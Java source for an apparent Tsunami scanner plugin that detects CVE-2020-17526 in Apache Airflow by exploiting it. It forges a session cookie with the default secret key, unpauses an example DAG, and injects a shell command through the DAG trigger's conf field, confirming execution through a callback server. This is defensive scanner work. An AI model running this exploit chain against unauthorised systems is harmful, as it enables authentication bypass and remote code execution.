/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.cve202017526;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugins.cve202017526.Annotations.OobSleepDuration;
import com.google.tsunami.plugins.cve202017526.flasksessionsigner.FlaskSessionSigner;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.HttpCookie;
import java.net.URLEncoder;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A VulnDetector plugin for CVE 202017526. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2020-17526 Detector",
    version = "0.1",
    description =
        "This detector checks for occurrences of CVE-2020-17526 in apache airflow installations.",
    author = "am0o0",
    bootstrapModule = Cve202017526DetectorModule.class)
@ForWebService
public final class Cve202017526Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final Pattern CSRF_PATTERN = Pattern.compile("var CSRF = \"([\\d\\w-.]+)\"");

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;

  @Inject
  Cve202017526Detector(
      @UtcClock Clock utcClock,
      HttpClient httpClient,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(true).build();
    this.oobSleepDuration = oobSleepDuration;
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    var payload = getTsunamiCallbackHttpPayload();
    if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "Tsunami callback server is not setup for this environment, cannot run CVE-2020-17526"
              + " Detector.");
      return false;
    }

    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    try {
      // 1. sending the first request to retrieve a valid CSRF token and a valid cookie
      Map<String, String> results = getFreshCsrfTokenAndSessionCookie(networkService);
      if (results == null) {
        return false;
      }
      String freshSessionCookieValue = results.get("freshSessionCookieValue");
      String freshCsrfToken = results.get("freshCsrfToken");

      // 2. enabling the vulnerable DAG
      this.httpClient.send(
          HttpRequest.post(
                  rootUrl + "admin/airflow/paused?is_paused=true&dag_id=example_trigger_target_dag")
              .setHeaders(
                  HttpHeaders.builder()
                      .addHeader("Cookie", String.format("session=%s", freshSessionCookieValue))
                      .addHeader("X-CSRFToken", freshCsrfToken)
                      .build())
              .build(),
          networkService);

      // 3. sending the RCE payload
      results = getFreshCsrfTokenAndSessionCookie(networkService);
      if (results == null) {
        return false;
      }

      freshSessionCookieValue = results.get("freshSessionCookieValue");
      freshCsrfToken = results.get("freshCsrfToken");

      String urlEncodedBody =
          "csrf_token=CSRFTOKEN&dag_id=example_trigger_target_dag&origin=%2Fadmin%2Fairflow%2Ftree%3Fdag_id%3Dexample_trigger_target_dag&conf=%7B%22message%22%3A%22%60PAYLOAD%60%22%7D"
              .replace("CSRFTOKEN", freshCsrfToken);
      urlEncodedBody =
          urlEncodedBody.replace("PAYLOAD", URLEncoder.encode(payload.getPayload(), UTF_8));

      this.httpClient.send(
          HttpRequest.post(
                  rootUrl
                      + "admin/airflow/trigger?dag_id=example_trigger_target_dag&origin=%2Fadmin%2Fairflow%2Ftree%3Fdag_id%3Dexample_trigger_target_dag")
              .setHeaders(
                  HttpHeaders.builder()
                      .addHeader("Cookie", String.format("session=%s", freshSessionCookieValue))
                      .addHeader("X-CSRFToken", freshCsrfToken)
                      .addHeader("Content-Type", "application/x-www-form-urlencoded")
                      .build())
              .setRequestBody(ByteString.copyFromUtf8(urlEncodedBody))
              .build(),
          networkService);

      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));

      return payload.checkIfExecuted();
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private Map<String, String> getFreshCsrfTokenAndSessionCookie(NetworkService networkService)
      throws IOException {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    Map<String, String> results = new HashMap<>();

    FlaskSessionSigner newToken =
        new FlaskSessionSigner(
            "{\"_fresh\":true,\"user_id\":1,\"_permanent\":true}",
            "Zzx63w",
            "temporary_key",
            "cookie-session");

    HttpResponse firstResponse =
        this.httpClient.send(
            HttpRequest.get(rootUrl + "admin/")
                .setHeaders(
                    HttpHeaders.builder()
                        .addHeader("Cookie", String.format("session=%s", newToken.dumps()))
                        .build())
                .build(),
            networkService);
    if (!(firstResponse.headers().get("Set-Cookie").isPresent()
        && firstResponse.bodyString().isPresent()
        && firstResponse.bodyString().get().contains("<title>Airflow - DAGs</title>"))) {
      return null;
    }
    List<HttpCookie> parsedCookies =
        HttpCookie.parse(firstResponse.headers().get("Set-Cookie").get());
    String freshSessionCookieValue = null;
    for (HttpCookie cookie : parsedCookies) {
      if (cookie.getName().equals("session")) {
        freshSessionCookieValue = cookie.getValue();
      }
    }
    if (freshSessionCookieValue == null) {
      return null;
    }
    results.put("freshSessionCookieValue", freshSessionCookieValue);

    Matcher m = CSRF_PATTERN.matcher(firstResponse.bodyString().get());
    if (!m.find()) {
      return null;
    }
    String freshCsrfToken = m.group(1);
    results.put("freshCsrfToken", freshCsrfToken);
    return results;
  }

  private Payload getTsunamiCallbackHttpPayload() {
    try {
      return this.payloadGenerator.generate(
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build());
    } catch (NotImplementedException n) {
      return null;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2020-17526"))
                .setSeverity(Severity.CRITICAL)
                .setTitle(
                    "CVE-2020-17526 Authentication bypass lead to Arbitrary Code Execution in"
                        + " Apache Airflow prior to 1.10.14")
                .setDescription(
                    "An attacker can bypass the authentication and then use a default DAG to"
                        + " execute arbitrary code on the server hosting the apache airflow"
                        + " application.")
                .setRecommendation(
                    "update to version 1.10.14. Also, you can change the default value for the"
                        + " '[webserver] secret_key' config to a securely generated random value to"
                        + " sign the cookies with a non-default secret key."))
        .build();
  }
}
